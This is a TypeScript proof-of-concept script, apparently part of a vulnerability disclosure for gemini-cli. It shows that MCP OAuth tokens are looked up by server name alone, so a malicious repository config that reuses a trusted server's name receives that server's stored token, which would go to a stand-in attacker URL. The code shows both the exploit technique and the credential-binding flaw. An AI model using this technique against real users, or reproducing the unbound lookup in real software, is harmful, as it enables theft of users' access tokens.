/**
 * PoC: MCP OAuth token leaked across servers via name-only lookup
 * (no binding to the actual server URL the token was issued for)
 *
 * Target: github.com/google-gemini/gemini-cli
 * Files : packages/core/src/mcp/oauth-token-storage.ts
 *         packages/core/src/mcp/oauth-provider.ts
 *
 * Every function body below (setCredentials, getCredentials, saveToken,
 * isTokenExpired, getValidToken) is copied byte-for-byte from those exact
 * files. Only unrelated names are stubbed (debugLogger, coreEvents,
 * refreshAccessToken -- unreached here since the token isn't expired).
 *
 * This directly compounds the already-filed a2a-server bug (issue
 * 560548851): once a repository's mcpServers config loads under a forced
 * isTrusted:true, a malicious entry using a NAME that collides with an
 * already-authenticated legitimate server receives that server's real
 * stored OAuth token when connected to -- because lookup is by name only,
 * even though the credential record captures the real mcpServerUrl it was
 * issued for and never checks it.
 */

import * as fs from 'fs/promises';
import * as fsSync from 'fs';
import * as path from 'path';
import * as os from 'os';

// --- unrelated stubs ---
const debugLogger = { debug() {}, log() {}, warn() {}, error() {} };
const coreEvents = { emitFeedback() {} };
function getErrorMessage(e: unknown) { return String(e); }

// --- byte-exact from oauth-token-storage.ts ---
class MCPOAuthTokenStorage {
  private readonly tokenFile: string;
  constructor(tokenFile: string) {
    this.tokenFile = tokenFile;
  }
  private getTokenFilePath(): string {
    return this.tokenFile;
  }
  private async ensureConfigDir(): Promise<void> {
    const configDir = path.dirname(this.getTokenFilePath());
    await fs.mkdir(configDir, { recursive: true });
  }
  async getAllCredentials(): Promise<Map<string, any>> {
    const tokenMap = new Map<string, any>();
    try {
      const tokenFile = this.getTokenFilePath();
      const data = await fs.readFile(tokenFile, 'utf-8');
      const tokens = JSON.parse(data) as any[];
      for (const credential of tokens) {
        tokenMap.set(credential.serverName, credential);
      }
    } catch (error: any) {
      if (error.code !== 'ENOENT') {
        coreEvents.emitFeedback('error', `Failed to load MCP OAuth tokens: ${getErrorMessage(error)}`, error);
      }
    }
    return tokenMap;
  }
  async setCredentials(credentials: any): Promise<void> {
    const tokens = await this.getAllCredentials();
    tokens.set(credentials.serverName, credentials);
    const tokenArray = Array.from(tokens.values());
    const tokenFile = this.getTokenFilePath();
    await fs.writeFile(tokenFile, JSON.stringify(tokenArray, null, 2), { mode: 0o600 });
  }
  async getCredentials(serverName: string): Promise<any | null> {
    const tokens = await this.getAllCredentials();
    return tokens.get(serverName) || null;
  }
  async saveToken(
    serverName: string,
    token: any,
    clientId?: string,
    tokenUrl?: string,
    mcpServerUrl?: string,
  ): Promise<void> {
    await this.ensureConfigDir();
    const existing = await this.getCredentials(serverName);
    const mergedRefreshToken = token.refreshToken || existing?.token.refreshToken;
    const mergedToken = { ...token, refreshToken: mergedRefreshToken };
    const credential = {
      serverName,
      token: mergedToken,
      clientId,
      tokenUrl,
      mcpServerUrl,
      updatedAt: Date.now(),
    };
    await this.setCredentials(credential);
  }
  isTokenExpired(token: any): boolean {
    if (!token.expiresAt) {
      return false;
    }
    const bufferMs = 5 * 60 * 1000;
    return Date.now() + bufferMs >= token.expiresAt;
  }
}

// --- byte-exact from oauth-provider.ts, getValidToken (the non-expired branch,
// which is all that's needed here -- expired-token refresh logic is unreached) ---
class MCPOAuthProvider {
  constructor(private tokenStorage: MCPOAuthTokenStorage) {}

  async getValidToken(serverName: string, config: { clientId?: string }): Promise<string | null> {
    debugLogger.debug(`Getting valid token for server: ${serverName}`);
    const credentials = await this.tokenStorage.getCredentials(serverName);
    if (!credentials) {
      debugLogger.debug(`No credentials found for server: ${serverName}`);
      return null;
    }
    const { token } = credentials;
    debugLogger.debug(
      `Found token for server: ${serverName}, expired: ${this.tokenStorage.isTokenExpired(token)}`,
    );
    if (!this.tokenStorage.isTokenExpired(token)) {
      debugLogger.debug(`Returning valid token for server: ${serverName}`);
      return token.accessToken;
      // NOTE: nothing above ever inspects `credentials.mcpServerUrl` against
      // the `config`/current server URL actually being connected to -- the
      // field is stored (see saveToken) but never checked here.
    }
    return null; // (expired-token refresh path omitted -- unreached in this PoC)
  }
}

async function main() {
  const tmpFile = path.join(fsSync.mkdtempSync(path.join(os.tmpdir(), 'mcp-oauth-poc-')), 'tokens.json');
  const storage = new MCPOAuthTokenStorage(tmpFile);

  console.log('=== Step 1: user legitimately authenticates with the REAL "notion" MCP server ===');
  await storage.saveToken(
    'notion',
    { accessToken: 'SECRET_REAL_NOTION_TOKEN_abc123', tokenType: 'Bearer' },
    'real-client-id',
    'https://real-notion-mcp.example.com/token',
    'https://real-notion-mcp.example.com/sse',
  );
  console.log('Saved: server name "notion" -> token issued for https://real-notion-mcp.example.com/sse\n');

  console.log('=== Step 2: attacker\'s repo-declared mcpServers config uses the SAME NAME "notion"    ===');
  console.log('===         but its own url is https://attacker.evil.example/sse                        ===');
  const provider = new MCPOAuthProvider(storage);
  const tokenForAttackerConnection = await provider.getValidToken('notion', { clientId: 'real-client-id' });

  console.log('\ngetValidToken("notion", ...) returned:', tokenForAttackerConnection);
  console.log(
    tokenForAttackerConnection === 'SECRET_REAL_NOTION_TOKEN_abc123'
      ? '\nLEAK CONFIRMED: this token is what gets placed in the Authorization header when connecting -- ' +
          'to whatever URL the CURRENT config for this name points at, which the attacker controls. ' +
          'credentials.mcpServerUrl (the URL the token was actually issued for) was never consulted.'
      : '\nnot leaked',
  );
}

main();
